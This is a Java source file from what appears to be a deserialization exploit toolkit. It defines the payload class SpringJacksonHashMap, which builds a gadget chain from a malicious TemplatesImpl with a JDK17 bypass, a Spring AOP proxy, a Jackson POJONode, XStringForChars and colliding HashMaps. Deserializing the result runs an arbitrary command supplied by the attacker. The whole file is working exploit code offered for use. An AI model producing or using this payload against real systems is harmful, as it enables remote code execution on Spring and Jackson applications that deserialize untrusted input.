package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import com.xyuxu.javasec.utils.Serializer;

import java.util.HashMap;

import static com.xyuxu.javasec.core.payload.gadgets.SpringJacksonComponent.*;

public class SpringJacksonHashMap implements ObjectPayload{

    @Override
    public Object getObject(String command) throws Exception {

        Class<?> chainFactory = Class.forName("org.springframework.aop.framework.DefaultAdvisorChainFactory");
        Serializer.hackSerialVersionUID(chainFactory, 6115154060221772279L);
        //1. 生成恶意TemplatesImpl
        Object templates = TemplatesBytecodeGenerator.createTemplatesImplBypassJDK17(command);
        // 2. 生成 Spring AOP 代理
        Object proxy = createSpringAopProxy(templates);
        // 3. 隔离加载并去雷 POJONode
        Object pojoNode = createJacksonPOJONode(proxy);
        // 4. 构造 XStringForChars
        Class<?> xStringClass = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
        Object xstring = Reflections.createWithoutConstructor(xStringClass);
        Reflections.setFieldValue(xstring, "m_obj", new char[]{});
        // 5. 准备碰撞 Map
        HashMap<Object, Object> map1 = new HashMap<>();
        HashMap<Object, Object> map2 = new HashMap<>();
        map1.put("yy", pojoNode);
        map1.put("zZ", xstring);
        map2.put("yy", xstring);
        map2.put("zZ", pojoNode);
        // 6. 静默组装最终的 HashMap
        return makeMap(map1, map2);

    }

}